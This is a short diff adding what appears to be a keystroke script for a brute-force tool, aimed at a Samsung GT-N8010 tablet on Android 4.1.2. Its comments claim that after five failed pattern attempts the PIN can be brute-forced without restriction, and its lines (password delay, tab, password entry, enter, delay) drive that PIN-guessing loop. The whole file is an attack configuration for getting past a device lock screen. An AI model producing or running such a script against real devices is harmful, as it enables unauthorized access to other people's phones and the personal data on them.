@@ -1,0 +1,11 @@
+#Samsung GT-N8010 (Galaxy Notes 10.1) with Android 4.1.2
+#When you failed 5 times on Android Pattern, you can bruteforce PinCode without restriction
+
+passwordDelay 125
+tab
+tab
+tab
+password
+enter
+enter
+delay 2250
